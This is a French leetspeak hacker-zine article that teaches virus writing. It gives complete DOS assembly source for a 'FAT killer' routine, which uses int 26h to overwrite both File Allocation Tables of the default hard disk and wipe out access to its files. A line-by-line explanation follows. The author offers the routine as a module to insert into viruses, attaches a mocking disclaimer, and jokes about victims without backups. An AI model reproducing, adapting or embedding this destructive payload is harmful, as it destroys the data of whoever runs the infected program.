Yo tous,

7 artikle devrair etre sur la programmation de Virus dans les divers
langages, mais on va kommenc avec l'Assembly (et je vais surement pas
kontinuer) ki est surement le + utilise dans le champ de la programmation
virale.

Dans 7 artikle je vous explikerais assez appronfonditement a ekrir un 
Fat Fucker (Traduction: Un virus ki detruit la Fat). Je passe a une petite
lecon de base sur les choses necessaires a kapt ce Virus : Fat c l'acronime
de File Allocation table.

c 7 sorte de record ou database du sisteme operatif ou sont memorise les
files existant sur l'Hard Disk. Par la Fat le sisteme operatif 
(toutes les referances seront vers sistemes operatif Microsoft tel dos
e superieurs) arrive a savoir dans kels cluster sont memorise les files ou
plutot kelle partie du file est memorisee dans un certain cluster. Dans 
notre visur on utilisera des fonctions tres comunes a l' ASM (ce sera le 
mot ki ramplaceras celui + long d'assembly.... g la fleme d'ecrire) kom les
jump, les registres e les locations de memoire. Je n'appronfondirait pas
trop sur l'argument ASM, si vous avez besoin d'autre chose envoyez-moi un
E-mail.

Continuons avec la partie la + interessante, mais je dois d'abord vous dire
un truk, 7 sorgent ASM n'est pas un virus komplet, mais seulement une
routine ki pourra vous etre utile dans vos prochains virus. Au fait je dois
aussi fair un petit disclamer style : Je ne me retient pas responsable de ce
ke voua ferez avec le code ke je vais vous filer, ce virus a ete ecrit x
la culture generale...bla bla bla.

D'abord je vous filerez tout le code de la routine puis j'analiserais le
fonctions e leur but.

;Fat Fucker - Routine inserible dans les Virus evolues
;Ecrit par yawn member of alm & pqn
;Dedie a la meilleur H/P/V/C Zine frankophone
.model tiny
.code
public fatfucker
extrn car_sec: near

fatfucker:
        push cx
        push bp
        push ax
        push dx               
        mov ax, 0dh
        int 21h               
        mov ah, 19h
        int 21h               
        xor dx, dx
        call car_sec         
        mov bp, bx
        mov cx, es:[bp+16h]   
        add cx, cx
        mov dx, 1
        int 26h               
        pop dx
        pop ax
        pop bp
        pop cx
        ret                   
end fatfucker

Kommencons le kommentaire...
en ASM tout ce ki vient ecrit apres le caractere ";" est un kommentaire
e le kompilateur le ignorera ca sert seulement au programmateur x
avoir une meilleur klarte x tout ce ki regarde le code.
	.model tiny
	.code
	public fatfucker

Ce sont des instructions donnees au kompilateur .model 
definis kelle zone occupera le virus dans la memoire.
l'instruction .code declare le debut du code, public fatfucker
est le nom du prg.
Ne vous preoccupez pas extrn car_sec: near je l'ai pas oublie, j'explik apres.
fatfucker: deklare le dbut du code c pratikement un label ou une etiket
adopte par ce programme, dans les virus vous trouverez souve,nt main: ou
start: moi g mis fatfucker parce ke ca ca n'a pas ete projette komme une
routine primaire mais kom un module ki peux s'inserir dans un virus en
chair et en os.
	push cx
	push bp
	push ax
	push dx  
c instructions je les ai ekrites x memoriser les valeurs kontenues
precedemment par c registres en memoire de facon a ne pas kompromettre avec
l'inserction de 7 routine le fonctionnement d'un virus
	mov ax, 0dh
        int 21h  
c 2 instructins resettent le disk c a dir k'elles portent le pointeur de 
l'hd de facon a repartir en une condition initiale en nous permettant
d'agir mieux sur le dispositif
	mov ah, 19h
        int 21h    
c 2 instructions selektionnent le drive ou agir dans le tentatif d'effacer
la fat, + precisement avec 7 procedureje selectionne l'hd de default evitant
d'essayer d'effacer la fat d'un cd-rom o d'une disket
	xor dx, dx
        call car_sec
c 2 instructions chargent en memoire le boot sector e l'istruction
call car_sec appele extrn car_sec: near 
donc l dit a l'assembleur de charger les secteur du boot.
	mov bp, bx
        mov cx, es:[bp+16h]
c 2 instructions revelent de kombien de secteurs sont formes les fat
(il fo rappeler ke les Fat du DOS sont 2 la principale et la sekondaires
exactement identikues, la seul diff c ke la primaire e utilise x toutes les
transitions sur l'hd alors ke la sekondaires se limite a fair un back up et
est utilise seulement en cas d'emergence; ca nous fait kpt kombien est
importante la Fatx un sisteme operatif, en effet si l devait disparaitre ou
etre efface on riskerais de perdre toute les infos kontenues dans notre Hard
Disk).
	add cx, cx
        mov dx, 1
        int 26h
c 3 instruction rreecrivent les 2 Fat causant un dommage quasi irreparable,
en effet seulement des expert ou des kons avec un Back Up peuvent recuperer
le tout. x des motifs educatif je dois vous dir k'il existe des prg ki
resolve les prb causes par notre prg le Rescue ou le Sbabr mais y en a bcp
d'autres (esperons ke tous ceux ki le recoivent sooent des cons kom ca on
fait bon impressions =)).
	pop dx
        pop ax
        pop bp
        pop cx
        ret 
c 5 instructions repristinent le kontenu  original des registres avant de
notre routione e la cmd ret declare ke le prg e finis 
 end fatfucker ferme la procedure fatfucker:  c indispensable ke l'ouverture
coincide avec la fermeture sinon notre assemblateur nous donnera des msg
d'erreurs e notre prg non fonctionnera pas bien.
Bon g fini j'esperre ke cA vous sera utile en futur c vos kreations
e j'espere ke je ne vous ai pas trop ennuye si vous avez des
kommentaires ou des kestions (ou des konneries bien sur  =) a me fsair
subir ecrivez une email a yawn@altern.org komme ca j'aurais kuelke chose a
faire a 4h du mat kand je me fais chier..
a la prochaine!
                                      yawn^alm^pqn

